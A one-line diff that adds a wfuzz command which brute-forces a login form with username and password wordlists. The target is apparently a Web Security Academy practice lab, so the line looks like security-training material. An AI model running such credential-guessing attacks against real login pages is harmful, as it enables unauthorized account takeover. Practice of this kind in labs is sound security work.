@@ -1,0 +1,1 @@
+wfuzz -c -z file,usernames -z file,password --hc 200 -d "username=FUZZ&password=FUZ2Z&autologin=1&enter=Sign+in" https://0a4600540367c1de8048e41f00d600f1.web-security-academy.net/login
